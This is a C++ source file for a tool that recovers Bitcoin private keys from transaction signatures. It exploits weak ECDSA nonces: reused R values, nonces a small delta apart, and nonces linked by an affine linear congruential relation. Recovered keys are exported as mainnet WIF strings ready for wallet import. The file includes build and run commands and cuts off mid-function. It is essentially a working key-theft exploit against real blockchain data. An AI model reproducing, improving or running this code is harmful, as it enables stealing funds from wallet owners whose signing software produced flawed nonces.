// ecdsa_recover_strict.cpp
// Build:
//
/*
sudo apt-get install -y g++ libsecp256k1-dev libssl-dev
g++ -O3 -march=native -flto -fexceptions -pthread -std=c++17 \
    ecdsa_recover_strict.cpp -o ecdsa_recover_strict \
    -lsecp256k1 -lcrypto -lpthread -Wno-deprecated-declarations
*/
/*
 Example:

./ecdsa_recover_strict \
  --sigs signatures.jsonl \
  --threads 12 \
  --out-json recovered_keys.jsonl \
  --out-txt  recovered_keys.txt \
  --out-k    recovered_k.jsonl \
  --out-deltas delta_insights.jsonl \
  --max-iter 4 \
  --preload-priv known_keys2.txt \
  --dg-max-delta 65536 \
  --dg-seeds 1,2,4,8,16,32,64,128,256,512,1024,2048,4096,8192,16384,32768,65536 \
  --dg-fill-step 8 \
  --dg-per-pair-cap 4096 \
  --step-seeds 3,5,7,9,11,13,17,19,29,37 \
  --lcg-a-max 4 --lcg-b-max 4096 --lcg-per-pair-cap 2048 \
  --scan-random-k 0 \
  --rand-seed 1337


*/

#include <bits/stdc++.h>
#include <secp256k1.h>
#include <openssl/sha.h>
#include <openssl/bn.h>
#include <openssl/rand.h>
#include <openssl/crypto.h>

using namespace std;

#include <boost/multiprecision/cpp_int.hpp>
using boost::multiprecision::cpp_int;

#include <filesystem>
namespace fs = std::filesystem;

// ------------------------------- Constants / Helpers -------------------------------
static const char* N_HEX =
 "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141";

static inline string hexlower(const string& s){
    string t=s; for(char& c:t) c=tolower((unsigned char)c); return t;
}
static inline bool is_hexlike(const string& s){
    if(s.empty()) return false;
    for(char c: s) if(!isxdigit((unsigned char)c)) return false;
    return true;
}
static string to_hex(const unsigned char* p,size_t n){
    static const char* he="0123456789abcdef";
    string s; s.resize(n*2);
    for(size_t i=0;i<n;i++){ s[2*i]=he[p[i]>>4]; s[2*i+1]=he[p[i]&0xF]; }
    return s;
}
static void sha256_once(const unsigned char* in,size_t len,unsigned char out[32]){
    SHA256_CTX c; SHA256_Init(&c); SHA256_Update(&c,in,len); SHA256_Final(out,&c);
}
static string b58encode(const vector<uint8_t>& in){
    static const char* ALPH="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    int zeros=0; while(zeros<(int)in.size() && in[zeros]==0) zeros++;
    vector<uint8_t> b(in.begin(), in.end());
    vector<char> out;
    int start=zeros;
    while(start<(int)b.size()){
        int carry=0;
        for(int i=start;i<(int)b.size();i++){
            int x = (int)b[i] + carry*256;
            b[i]=x/58; carry = x%58;
        }
        out.push_back(ALPH[carry]);
        while(start<(int)b.size() && b[start]==0) start++;
    }
    string s(zeros,'1'); for(auto it=out.rbegin(); it!=out.rend(); ++it) s.push_back(*it);
    return s;
}
static string priv_to_wif(const string& priv_hex, bool compressed=true, bool mainnet=true){
    vector<uint8_t> payload;
    payload.push_back(mainnet?0x80:0xEF);
    vector<uint8_t> sk(32,0);
    for(int i=0;i<32;i++){
        string byte = priv_hex.substr(i*2,2);
        sk[i]=(uint8_t)strtoul(byte.c_str(),nullptr,16);
    }
    payload.insert(payload.end(), sk.begin(), sk.end());
    if(compressed) payload.push_back(0x01);
    unsigned char h1[32], h2[32];
    sha256_once(payload.data(), payload.size(), h1);
    sha256_once(h1, 32, h2);
    payload.insert(payload.end(), h2, h2+4);
    return b58encode(payload);
}

static string wif_json_fields(const string& priv_hex){
    string wc = priv_to_wif(priv_hex, true, true);
    string wu = priv_to_wif(priv_hex, false, true);
    return string("\"wif\":\"") + wc +
           "\",\"wif_compressed\":\"" + wc +
           "\",\"wif_uncompressed\":\"" + wu + "\"";
}

static string wif_txt_fields(const string& priv_hex){
    string wc = priv_to_wif(priv_hex, true, true);
    string wu = priv_to_wif(priv_hex, false, true);
    return string("WIF_COMPRESSED=") + wc + " WIF_UNCOMPRESSED=" + wu;
}

// ------------------------------- JSONL mini-parser -------------------------------
static bool jsonl_get(const string& line, const string& key, string& out){
    size_t k = line.find("\""+key+"\"");
    if(k==string::npos) return false;
    size_t c = line.find(':', k);
    if(c==string::npos) return false;
    size_t i=c+1;
    while(i<line.size() && isspace((unsigned char)line[i])) i++;
    if(i>=line.size()) return false;
    if(line[i]=='"'){
        size_t j=line.find('"', i+1);
        if(j==string::npos) return false;
        out = line.substr(i+1, j-(i+1));
        return true;
    }else{
        size_t j=i;
        while(j<line.size() && line[j]!=',' && line[j]!='}') j++;
        out = line.substr(i, j-i);
        while(!out.empty() && isspace((unsigned char)out.back())) out.pop_back();
        while(!out.empty() && isspace((unsigned char)out.front())) out.erase(out.begin());
        return !out.empty();
    }
}

// ------------------------------- OpenSSL BN helpers -------------------------------
struct BNWrap {
    BIGNUM* n=nullptr;
    BNWrap(){ n=BN_new(); }
    ~BNWrap(){ if(n) BN_free(n); }
    BNWrap(const BNWrap&)=delete;
    BNWrap& operator=(const BNWrap&)=delete;
    BNWrap(BNWrap&& other) noexcept : n(other.n) { other.n = nullptr; }
    BNWrap& operator=(BNWrap&& other) noexcept {
        if (this != &other) { if (n) BN_free(n); n = other.n; other.n = nullptr; }
        return *this;
    }
};
struct Ctx {
    BN_CTX* ctx=nullptr;
    BIGNUM* N=nullptr;
    BIGNUM* halfN=nullptr;
    Ctx() {
        ctx=BN_CTX_new();
        N=BN_new();
        halfN=BN_new();
        BN_hex2bn(&N, N_HEX);
        BN_copy(halfN, N);
        BN_rshift1(halfN, halfN); // N/2
    }
    ~Ctx(){ if(halfN) BN_free(halfN); if(N) BN_free(N); if(ctx) BN_CTX_free(ctx); }
};
static bool bn_from_hex(const string& hx, BIGNUM* out){
    string t = hx;
    if (t.size()>=2 && t[0]=='0' && (t[1]=='x'||t[1]=='X')) t = t.substr(2);
    if (t.empty()) return false;
    BIGNUM* tmp = nullptr;
    if (BN_hex2bn(&tmp, t.c_str()) <= 0) return false;
    BN_copy(out, tmp); BN_free(tmp); return true;
}
static void bn_mod(Ctx& C, BIGNUM* a){ BN_nnmod(a,a,C.N,C.ctx); }
static void bn_addm(Ctx& C, const BIGNUM* a,const BIGNUM* b,BIGNUM* r){ BN_mod_add(r,a,b,C.N,C.ctx); }
static void bn_subm(Ctx& C, const BIGNUM* a,const BIGNUM* b,BIGNUM* r){ BN_mod_sub(r,a,b,C.N,C.ctx); }
static void bn_mulm(Ctx& C, const BIGNUM* a,const BIGNUM* b,BIGNUM* r){ BN_mod_mul(r,a,b,C.N,C.ctx); }
static bool bn_invm(Ctx& C, const BIGNUM* a, BIGNUM* r){
    BIGNUM* inv = BN_mod_inverse(nullptr,a,C.N,C.ctx);
    if(!inv) return false;
    BN_copy(r, inv); BN_free(inv); return true;
}
static void bn_set_int64_mod(Ctx& C, long long v, BIGNUM* r){
    if(v>=0){ BN_set_word(r, (BN_ULONG)v); }
    else{
        BN_set_word(r, (BN_ULONG)(-v));
        BN_mod_sub(r, C.N, r, C.N, C.ctx); // r = -|v| mod N
    }
}
static string bn_hex(BIGNUM* x){
    char* h=BN_bn2hex(x);
    string s=h?h:"";
    OPENSSL_free(h);
    if(s.size()<64) s=string(64-s.size(),'0')+s;
    for(char& c: s) c=tolower((unsigned char)c);
    return s;
}

// s == k^{-1}(z + r d) mod n  <=> s*k == z + r d mod n
static bool ecdsa_ok(Ctx& C, const BIGNUM* s, const BIGNUM* z, const BIGNUM* r,
                     const BIGNUM* d, const BIGNUM* k, BNWrap& tmp1, BNWrap& tmp2){
    bn_mulm(C, s, k, tmp1.n);
    bn_mulm(C, r, d, tmp2.n);
    bn_addm(C, tmp2.n, z, tmp2.n);
    return BN_cmp(tmp1.n, tmp2.n)==0;
}

// ------------------------------- Secp256k1 glue -------------------------------
struct Secp {
    secp256k1_context* ctx=nullptr;
    Secp(){
        ctx = secp256k1_context_create(SECP256K1_CONTEXT_VERIFY|SECP256K1_CONTEXT_SIGN);
        randomize();
    }
    ~Secp(){ if(ctx) secp256k1_context_destroy(ctx); }
    void randomize() {
        unsigned char seed[32];
        if (RAND_bytes(seed, sizeof(seed)) == 1) {
            (void)secp256k1_context_randomize(ctx, seed);
            OPENSSL_cleanse(seed, sizeof(seed));
        }
    }
    pair<string,string> pub_from_priv32(const array<unsigned char,32>& sk){
        if(!secp256k1_ec_seckey_verify(ctx, sk.data())) return {"",""};
        secp256k1_pubkey pk;
        if(!secp256k1_ec_pubkey_create(ctx, &pk, sk.data())) return {"",""};
        unsigned char out33[33]; size_t l1=33;
        unsigned char out65[65]; size_t l2=65;
        secp256k1_ec_pubkey_serialize(ctx, out33, &l1, &pk, SECP256K1_EC_COMPRESSED);
        secp256k1_ec_pubkey_serialize(ctx, out65, &l2, &pk, SECP256K1_EC_UNCOMPRESSED);
        return { to_hex(out33,l1), to_hex(out65,l2) };
    }
    pair<string,string> pub_from_priv_bn(const string& priv_hex){
        array<unsigned char,32> sk{};
        for(int i=0;i<32;i++){
            string byte = priv_hex.substr(i*2,2);
            sk[i]=(unsigned char)strtoul(byte.c_str(),nullptr,16);
        }
        return pub_from_priv32(sk);
    }
};

// r' from k·G check
static bool r_from_k_matches(Ctx& C, Secp& S, const string& r_hex, const BIGNUM* k){
    if(BN_is_zero(k)) return false;
    // k to 32 bytes
    array<unsigned char,32> k32{};
    vector<unsigned char> tmp(32);
    BN_bn2binpad(k, tmp.data(), 32);
    memcpy(k32.data(), tmp.data(), 32);
    // R = k*G
    secp256k1_pubkey R;
    if(!secp256k1_ec_pubkey_create(S.ctx, &R, k32.data())) return false;
    unsigned char P[65]; size_t L=65;
    secp256k1_ec_pubkey_serialize(S.ctx, P, &L, &R, SECP256K1_EC_UNCOMPRESSED);
    // x coord is P[1..32]; reduce mod n
    BNWrap x; BN_bin2bn(P+1, 32, x.n);
    bn_mod(C, x.n);
    string rx = bn_hex(x.n);
    return hexlower(r_hex) == rx;
}

// ------------------------------- Row / Precompute -------------------------------
struct Row {
    string txid, pub; int vin=0;
    string r_hex, s_hex, z_hex;
    BNWrap r,s,z,s_inv,A,B;
    Row()=default;
    Row(const Row&)=delete;
    Row& operator=(const Row&)=delete;
    Row(Row&&) noexcept = default;
    Row& operator=(Row&&) noexcept = default;
};
static bool parse_row(const string& line, Row& out){
    string r,s,z,tx,vin_s,pub;
    if(!jsonl_get(line,"r",r)) return false;
    if(!jsonl_get(line,"s",s)) return false;
    if(!jsonl_get(line,"z",z)) return false;
    jsonl_get(line,"txid",tx);
    jsonl_get(line,"vin",vin_s);
    if(!vin_s.empty()){
        try{ out.vin = stoi(vin_s); }catch(...){ out.vin=0; }
    } else out.vin=0;
    string p1,p2;
    if(jsonl_get(line,"pubkey_hex",p1)) pub=p1;
    else if(jsonl_get(line,"pub",p2)) pub=p2;
    out.txid = tx; out.pub = hexlower(pub);
    out.r_hex = hexlower(r); out.s_hex=hexlower(s); out.z_hex=hexlower(z);
    return true;
}
static bool precompute_row(Ctx& C, Row& R){
    if(!bn_from_hex(R.r_hex,R.r.n)) return false;
    if(!bn_from_hex(R.s_hex,R.s.n)) return false;
    if(!bn_from_hex(R.z_hex,R.z.n)) return false;

    // Low-S normalization: if s > N/2 -> s = N - s
    if(BN_cmp(R.s.n, C.halfN) > 0){
        BNWrap ns; BN_mod_sub(ns.n, C.N, R.s.n, C.N, C.ctx);
        BN_copy(R.s.n, ns.n);
        // ჩანაცვლება hex სტრინგშიც (ინფორმაციული თანმიმდევრულობისთვის)
        R.s_hex = bn_hex(R.s.n);
    }

    if(!bn_invm(C, R.s.n, R.s_inv.n)) return false;
    bn_mulm(C, R.r.n, R.s_inv.n, R.A.n);
    bn_mulm(C, R.z.n, R.s_inv.n, R.B.n);
    return true;
}

// ------------------------------- File bucketing & dedup -------------------------------
static inline string r_bucket_name(const string& rhex){
    return "r_" + rhex.substr(0,2);
}
static inline string short_hash_hex(const string& s){
    unsigned char h[32];
    sha256_once((const unsigned char*)s.data(), s.size(), h);
    return to_hex(h, 8);
}
static inline string pub_bucket_name(const Row& rw){
    if(!rw.pub.empty()) return "pub_" + short_hash_hex(rw.pub);
    return r_bucket_name(rw.r_hex);
}
struct FileBuf {
    ofstream f;
    void open(const string& path){
        f.open(path, ios::out|ios::app);
        f.rdbuf()->pubsetbuf(nullptr, 0);
    }
    void write(const string& s){ f<<s<<'\n'; }
};
static void pass0_bucketize_and_dedup(const string& sigs, const string& tmpdir,
                                      const string& bucket_mode,
                                      vector<string>& buckets_out)
{
    std::error_code ec;
    fs::create_directories(tmpdir, ec);
    if (ec) cerr << "[warn] mkdir " << tmpdir << ": " << ec.message() << "\n";

    unordered_map<string, unique_ptr<FileBuf>> writers; writers.reserve(260);
    {
        ifstream in(sigs);
        string line; size_t cnt=0;
        while(getline(in,line)){
            Row rw; if(!parse_row(line,rw)) continue;
            string b = (bucket_mode == "pub") ? pub_bucket_name(rw) : r_bucket_name(rw.r_hex);
            string path = tmpdir + "/" + b + ".raw.jsonl";
            auto& ptr = writers[b];
            if(!ptr){ ptr.reset(new FileBuf()); ptr->open(path); }
            ptr->write(line);
            if((++cnt % 500000)==0) cerr<<"[pass0] lines="<<cnt<<"\n";
        }
        cerr<<"[pass0] done. lines="<<cnt<<"\n";
    }

    // Ensure all raw bucket files are flushed before reading them back for dedup.
    for (auto& kv : writers) {
        if (kv.second && kv.second->f.is_open()) {
            kv.second->f.flush();
            kv.second->f.close();
        }
    }

    for(auto& kv: writers){
        string b = kv.first;
        string inpath  = tmpdir+"/"+b+".raw.jsonl";
        string outpath = tmpdir+"/"+b+".jsonl";
        ifstream in(inpath);
        ofstream out(outpath);
        unordered_set<string> seen; seen.reserve(1<<20);
        size_t kept=0; string line;
        while(getline(in,line)){
            Row rw; if(!parse_row(line,rw)) continue;
            string key = rw.txid + "|" + to_string(rw.vin) + "|" + rw.pub + "|" + rw.r_hex + "|" + rw.s_hex + "|" + rw.z_hex;
            if(seen.insert(key).second){ out<<line<<"\n"; kept++; }
        }
        out.close(); in.close();
        buckets_out.push_back(outpath);
        cerr<<"[pass0-dedup] "<<b<<": kept="<<kept<<"\n";
        std::error_code ec2; fs::remove(inpath, ec2);
    }
}

// ------------------------------- Recovery store -------------------------------
struct RecStore {
    mutex m;
    unordered_map<string,string> priv_by_pub; // pub -> priv_hex
    unordered_map<string, unordered_set<string>> k_by_r; // r -> set(khex)
    bool add_priv(const string& pub, const string& priv){
        lock_guard<mutex> lk(m);
        auto it = priv_by_pub.find(pub);
        if(it != priv_by_pub.end() && it->second == priv) return false;
        priv_by_pub[pub]=priv;
        return true;
    }
    bool has_priv_pub(const string& pub){ lock_guard<mutex> lk(m); return priv_by_pub.count(pub); }
    bool get_priv_pub(const string& pub, string& priv){ lock_guard<mutex> lk(m); auto it=priv_by_pub.find(pub); if(it==priv_by_pub.end()) return false; priv=it->second; return true;}
    bool add_k(const string& r, const string& khex){ lock_guard<mutex> lk(m); return k_by_r[r].insert(khex).second; }
    bool get_kset(const string& r, vector<string>& out){ lock_guard<mutex> lk(m); auto it=k_by_r.find(r); if(it==k_by_r.end()) return false; out.assign(it->second.begin(), it->second.end()); return true; }
    bool empty_k(const string& r){ lock_guard<mutex> lk(m); return !k_by_r.count(r); }
    vector<pair<string, vector<string>>> snapshot_k(){
        lock_guard<mutex> lk(m);
        vector<pair<string, vector<string>>> out;
        out.reserve(k_by_r.size());
        for(auto& kv : k_by_r){
            vector<string> ks(kv.second.begin(), kv.second.end());
            sort(ks.begin(), ks.end());
            out.push_back({kv.first, std::move(ks)});
        }
        sort(out.begin(), out.end(), [](const auto& a, const auto& b){ return a.first < b.first; });
        return out;
    }
};

struct OutputSink {
    mutex m;
    unordered_set<string> seen_keys; // pub|priv

    void preload_existing(const string& out_json)
    {
        if(out_json.empty()) return;
        ifstream in(out_json);
        if(!in.good()) return;
        string line, pub, priv;
        while(getline(in, line)){
            if(!jsonl_get(line, "pubkey", pub)) continue;
            if(!jsonl_get(line, "priv_hex", priv)) continue;
            seen_keys.insert(pub + "|" + priv);
        }
    }

    bool emit_unique_key(const string& out_json, const string& out_txt,
                         const string& pub, const string& priv,
                         const string& json_line, const string& txt_line)
    {
        string id = pub + "|" + priv;
        lock_guard<mutex> lk(m);
        if(!seen_keys.insert(id).second) return false;
        ofstream(out_json, ios::app) << json_line << "\n";
        ofstream(out_txt, ios::app)  << txt_line  << "\n";
        return true;
    }
};

static OutputSink GOUT;
static mutex GLOG_M;

static void log_line(const string& s){
    lock_guard<mutex> lk(GLOG_M);
    cerr << s << "\n";
}

// ------------------------------- Primary dup-R -------------------------------
static int try_primary_dupR(Ctx& C, Secp& S, const vector<Row>& rows,
                            RecStore& store, const string& out_json, const string& out_txt, const string& /*out_k*/,
                            size_t& pairs_tested)
{
    unordered_map<string, vector<int>> gp; gp.reserve(rows.size());
    for(int i=0;i<(int)rows.size();++i){
        if(rows[i].pub.empty()) continue;
        gp[rows[i].r_hex + "|" + rows[i].pub].push_back(i);
    }
    int found=0;
    BNWrap denom, k, k2, rinv, tmp, chk1, chk2;
    for(auto& kv: gp){
        auto& idxs=kv.second;
        if((int)idxs.size()<2) continue;
        for(int a=0;a<(int)idxs.size();++a){
            for(int b=a+1;b<(int)idxs.size();++b){
                pairs_tested++;
                const Row& R1 = rows[idxs[a]];
                const Row& R2 = rows[idxs[b]];
                for(int path=0;path<2;path++){
                    if(path==0) BN_mod_sub(denom.n,R1.s.n,R2.s.n,C.N,C.ctx);
                    else        BN_mod_add(denom.n,R1.s.n,R2.s.n,C.N,C.ctx);
                    if(BN_is_zero(denom.n)) continue;
                    if(!bn_invm(C, denom.n, denom.n)) continue;
                    BN_mod_sub(k.n,R1.z.n,R2.z.n,C.N,C.ctx);
                    bn_mulm(C, k.n, denom.n, k.n);
                    if(BN_is_zero(k.n)) continue;

                    // r-from-k verification
                    if(!r_from_k_matches(C, S, R1.r_hex, k.n)) continue;
                    if(path==0) BN_copy(k2.n, k.n);
                    else        BN_mod_sub(k2.n, C.N, k.n, C.N, C.ctx);
                    if(BN_is_zero(k2.n)) continue;

                    if(!bn_invm(C, R1.r.n, rinv.n)) continue;
                    BN_mod_mul(tmp.n, R1.s.n, k.n, C.N, C.ctx);
                    BN_mod_sub(tmp.n, tmp.n, R1.z.n, C.N, C.ctx);
                    bn_mulm(C, tmp.n, rinv.n, tmp.n); // tmp=d
                    if(!ecdsa_ok(C, R1.s.n, R1.z.n, R1.r.n, tmp.n, k.n, chk1, chk2)) continue;
                    if(!ecdsa_ok(C, R2.s.n, R2.z.n, R2.r.n, tmp.n, k2.n, chk1, chk2)) continue;
                    string dhex = bn_hex(tmp.n);
                    auto pubs = S.pub_from_priv_bn(dhex);
                    if(R1.pub==pubs.first || R1.pub==pubs.second){
                        store.add_priv(R1.pub, dhex);
                        GOUT.emit_unique_key(
                            out_json,
                            out_txt,
                            R1.pub,
                            dhex,
                            string("{\"pubkey\":\"") + R1.pub + "\",\"priv_hex\":\"" + dhex +
                            "\"," + wif_json_fields(dhex) + ",\"r\":\"" + R1.r_hex + "\",\"method\":\"primary\"}",
                            string("PUB=") + R1.pub + " PRIV=" + dhex + " " + wif_txt_fields(dhex) +
                            " R=" + R1.r_hex + " (primary)"
                        );
                        string khex=bn_hex(k.n);
                        store.add_k(R1.r_hex, khex);
                        BNWrap nk; BN_mod_sub(nk.n, C.N, k.n, C.N, C.ctx);
                        store.add_k(R1.r_hex, bn_hex(nk.n));
                        found++;
                    }
                }
            }
        }
    }
    return found;
}

// ------------------------------- Delta-gradient scan -------------------------------
struct PairPlan {
    int i,j;
    BNWrap alpha, beta; // d(δ) = alpha*δ + beta
    BNWrap u, v;        // k1(δ) = u*δ + v
    bool ok=false;
};
static bool plan_pair(Ctx& C, const Row& R1, const Row& R2, PairPlan& P){
    if(R1.r_hex == R2.r_hex) return false;
    BNWrap denom, denom_inv, B2mB1;
    BN_mod_sub(denom.n, R2.A.n, R1.A.n, C.N, C.ctx);
    if(BN_is_zero(denom.n)) return false;
    if(!bn_invm(C, denom.n, denom_inv.n)) return false;
    BN_mod_sub(B2mB1.n, R2.B.n, R1.B.n, C.N, C.ctx);
    BN_mod_mul(P.beta.n, denom_inv.n, B2mB1.n, C.N, C.ctx);
    BN_mod_sub(P.beta.n, C.N, P.beta.n, C.N, C.ctx); // negate
    BN_copy(P.alpha.n, denom_inv.n);
    BN_mod_mul(P.u.n, R1.A.n, P.alpha.n, C.N, C.ctx);
    BN_mod_mul(P.v.n, R1.A.n, P.beta.n, C.N, C.ctx);
    BN_mod_add(P.v.n, P.v.n, R1.B.n, C.N, C.ctx);
    P.ok=true; return true;
}
static int delta_scan_bucket(Ctx& C, Secp& S, const vector<Row>& rows,
                             const vector<uint64_t>& gradient, const vector<uint64_t>& step_sched,
                             bool nopub, int per_pair_cap,
                             RecStore& store, const string& out_json, const string& out_txt, const string& out_delta,
                             size_t& pairs_tested)
{
    unordered_map<string, vector<int>> groups;
    groups.reserve(rows.size());
    for(int i=0;i<(int)rows.size();++i){
        if(nopub) groups["_"].push_back(i);
        else{
            if(rows[i].pub.empty()) continue;
            groups[rows[i].pub].push_back(i);
        }
    }
    int hits=0;
    BNWrap delta, d, k1, k2, tmp1, tmp2, rinv;

    for(auto& g: groups){
        auto& idx = g.second;
        if((int)idx.size()<2) continue;

        // ადაპტიური cap დიდი ჯგუფისთვის
        int local_cap = min(per_pair_cap, max(256, (int)(64.0 * log2((double)idx.size()+1.0))));

        for(int a=0;a<(int)idx.size();++a){
            for(int b=a+1;b<(int)idx.size();++b){
                pairs_tested++;
                const Row& R1 = rows[idx[a]];
                const Row& R2 = rows[idx[b]];
                PairPlan P; if(!plan_pair(C,R1,R2,P)) continue;
                int tried=0; bool found=false;
                auto try_delta = [&](uint64_t del){
                    tried++;
                    BN_set_word(delta.n, del);
                    BN_mod_mul(d.n, P.alpha.n, delta.n, C.N, C.ctx);
                    BN_mod_add(d.n, d.n, P.beta.n, C.N, C.ctx);
                    BN_mod_mul(k1.n, P.u.n, delta.n, C.N, C.ctx);
                    BN_mod_add(k1.n, k1.n, P.v.n, C.N, C.ctx);
                    BN_mod_add(k2.n, k1.n, delta.n, C.N, C.ctx);
                    if(!ecdsa_ok(C, R1.s.n, R1.z.n, R1.r.n, d.n, k1.n, tmp1, tmp2)) return false;
                    if(!ecdsa_ok(C, R2.s.n, R2.z.n, R2.r.n, d.n, k2.n, tmp1, tmp2)) return false;

                    // r-from-k check ორივეზე
                    if(!r_from_k_matches(C, S, R1.r_hex, k1.n)) return false;
                    if(!r_from_k_matches(C, S, R2.r_hex, k2.n)) return false;

                    string pub_out;
                    string dhex = bn_hex(d.n);
                    if(!nopub){
                        auto pubs = S.pub_from_priv_bn(dhex);
                        if(R1.pub!=pubs.first && R1.pub!=pubs.second) return false;
                        pub_out = R1.pub;
                    }else{
                        pub_out = S.pub_from_priv_bn(dhex).first;
                    }
                    store.add_priv(pub_out, dhex);
                    GOUT.emit_unique_key(
                        out_json,
                        out_txt,
                        pub_out,
                        dhex,
                        string("{\"pubkey\":\"") + pub_out + "\",\"priv_hex\":\"" + dhex +
                        "\"," + wif_json_fields(dhex) + ",\"method\":\"delta\",\"delta\":\"" + bn_hex(delta.n) + "\"}",
                        string("PUB=") + pub_out + " PRIV=" + dhex + " " + wif_txt_fields(dhex) +
                        " via " + R1.txid + ":" + to_string(R1.vin) + " & " + R2.txid + ":" + to_string(R2.vin) +
                        " (delta=" + bn_hex(delta.n) + ")"
                    );
                    ofstream(out_delta, ios::app)
                        << "{\"pubkey\":\""<<pub_out<<"\",\"delta_hex\":\""<<bn_hex(delta.n)<<"\","
                        << "\"pair\":[{\"r\":\""<<R1.r_hex<<"\",\"s\":\""<<R1.s_hex<<"\",\"z\":\""<<R1.z_hex<<"\"},"
                        << "{\"r\":\""<<R2.r_hex<<"\",\"s\":\""<<R2.s_hex<<"\",\"z\":\""<<R2.z_hex<<"\"}],"
                        << "\"why\":\"gradient/step\"}\n";
                    string k1h = bn_hex(k1.n);
                    string k2h = bn_hex(k2.n);
                    store.add_k(R1.r_hex, k1h);
                    store.add_k(R2.r_hex, k2h);
                    BNWrap nk;
                    BN_mod_sub(nk.n, C.N, k1.n, C.N, C.ctx); store.add_k(R1.r_hex, bn_hex(nk.n));
                    BN_mod_sub(nk.n, C.N, k2.n, C.N, C.ctx); store.add_k(R2.r_hex, bn_hex(nk.n));
                    hits++; found=true; return true;
                };
                for(uint64_t del: gradient){
                    if(try_delta(del)) break;
                    if(tried>=local_cap) break;
                }
                if(!found){
                    for(uint64_t del: step_sched){
                        if(try_delta(del)) break;
                        if(tried>=local_cap) break;
                    }
                }
            }
        }
    }
    return hits;
}

// ------------------------------- Affine-LCG scan (k2 = a*k1 + b) -------------------------------
static int lcg_scan_bucket(Ctx& C, Secp& S, const vector<Row>& rows,
                           long long a_max, long long b_max, int per_pair_cap,
                           RecStore& store, const string& out_json, const string& out_txt, const string& out_delta,
                           size_t& pairs_tested)
{
    // ჯგუფი pub-ის მიხედვით (nopub-ზე ეს ვერ ვალიდირდება კარგად)
    unordered_map<string, vector<int>> groups;
    for(int i=0;i<(int)rows.size();++i){
        if(rows[i].pub.empty()) continue;
        groups[rows[i].pub].push_back(i);
    }
    int hits=0;

    BNWrap a_bn, b_bn, one; BN_set_word(one.n, 1);
    BNWrap s1inv_r1, s2inv_r2, s1inv_z1, s2inv_z2;
    BNWrap denom, denom_inv, num, d, k1, k2, tmp1, tmp2;

    for(auto& g: groups){
        auto& idx = g.second;
        if((int)idx.size()<2) continue;

        int local_cap = min(per_pair_cap, max(256, (int)(64.0 * log2((double)idx.size()+1.0))));

        for(int a=0;a<(int)idx.size();++a){
            for(int b=a+1;b<(int)idx.size();++b){
                pairs_tested++;
                const Row& R1 = rows[idx[a]];
                const Row& R2 = rows[idx[b]];

                // წინასწარი სიჩქარისთვის
                BN_mod_mul(s1inv_r1.n, R1.s_inv.n, R1.r.n, C.N, C.ctx);
                BN_mod_mul(s2inv_r2.n, R2.s_inv.n, R2.r.n, C.N, C.ctx);
                BN_mod_mul(s1inv_z1.n, R1.s_inv.n, R1.z.n, C.N, C.ctx);
                BN_mod_mul(s2inv_z2.n, R2.s_inv.n, R2.z.n, C.N, C.ctx);

                int tried=0; bool found=false;

                auto try_ab = [&](long long da, long long bb)->bool{
                    tried++;
                    // a = 1 + da  (mod n)
                    if(da>=0){
                        BN_set_word(a_bn.n, (BN_ULONG)da);
                        BN_mod_add(a_bn.n, a_bn.n, one.n, C.N, C.ctx);
                    }else{
                        BN_set_word(a_bn.n, (BN_ULONG)(-da));
                        BN_mod_sub(a_bn.n, one.n, a_bn.n, C.N, C.ctx);
                    }
                    // b = bb (signed mod)
                    bn_set_int64_mod(C, bb, b_bn.n);

                    // denom = s2^{-1} r2 - a*s1^{-1} r1
                    BN_mod_mul(denom.n, a_bn.n, s1inv_r1.n, C.N, C.ctx);
                    BN_mod_sub(denom.n, s2inv_r2.n, denom.n, C.N, C.ctx);
                    if(BN_is_zero(denom.n)) return false;
                    if(!bn_invm(C, denom.n, denom_inv.n)) return false;

                    // num = b + a*s1^{-1} z1 - s2^{-1} z2
                    BN_mod_mul(num.n, a_bn.n, s1inv_z1.n, C.N, C.ctx);
                    BN_mod_add(num.n, num.n, b_bn.n, C.N, C.ctx);
                    BN_mod_sub(num.n, num.n, s2inv_z2.n, C.N, C.ctx);

                    // d = num * denom^{-1}
                    BN_mod_mul(d.n, num.n, denom_inv.n, C.N, C.ctx);

                    // k1 = s1^{-1}(z1 + r1 d); k2 = s2^{-1}(z2 + r2 d)
                    BN_mod_mul(k1.n, R1.r.n, d.n, C.N, C.ctx);
                    BN_mod_add(k1.n, k1.n, R1.z.n, C.N, C.ctx);
                    BN_mod_mul(k1.n, k1.n, R1.s_inv.n, C.N, C.ctx);

                    BN_mod_mul(k2.n, R2.r.n, d.n, C.N, C.ctx);
                    BN_mod_add(k2.n, k2.n, R2.z.n, C.N, C.ctx);
                    BN_mod_mul(k2.n, k2.n, R2.s_inv.n, C.N, C.ctx);

                    // ორი სიგნატურის სრული ვერიფიკაცია + r-from-k
                    if(!ecdsa_ok(C, R1.s.n, R1.z.n, R1.r.n, d.n, k1.n, tmp1, tmp2)) return false;
                    if(!ecdsa_ok(C, R2.s.n, R2.z.n, R2.r.n, d.n, k2.n, tmp1, tmp2)) return false;
                    if(!r_from_k_matches(C, S, R1.r_hex, k1.n)) return false;
                    if(!r_from_k_matches(C, S, R2.r_hex, k2.n)) return false;

                    string dhex = bn_hex(d.n);
                    auto pubs = S.pub_from_priv_bn(dhex);
                    if(R1.pub!=pubs.first && R1.pub!=pubs.second) return false;

                    store.add_priv(R1.pub, dhex);
                    GOUT.emit_unique_key(
                        out_json,
                        out_txt,
                        R1.pub,
                        dhex,
                        string("{\"pubkey\":\"") + R1.pub + "\",\"priv_hex\":\"" + dhex +
                        "\"," + wif_json_fields(dhex) + ",\"method\":\"affine-lcg\",\"a\":\"" +
                        bn_hex(a_bn.n) + "\",\"b\":\"" + bn_hex(b_bn.n) + "\"}",
                        string("PUB=") + R1.pub + " PRIV=" + dhex + " " + wif_txt_fields(dhex) +
                        " via " + R1.txid + ":" + to_string(R1.vin) + " & " + R2.txid + ":" + to_string(R2.vin) +
                        " (affine-lcg a=" + bn_hex(a_bn.n) + ", b=" + bn_hex(b_bn.n) + ")"
                    );
                    ofstream(out_delta, ios::app)
                        << "{\"pubkey\":\""<<R1.pub<<"\",\"why\":\"affine-lcg\","
                        << "\"pair\":[{\"r\":\""<<R1.r_hex<<"\",\"s\":\""<<R1.s_hex<<"\",\"z\":\""<<R1.z_hex<<"\"},"
                        << "{\"r\":\""<<R2.r_hex<<"\",\"s\":\""<<R2.s_hex<<"\",\"z\":\""<<R2.z_hex<<"\"}],"
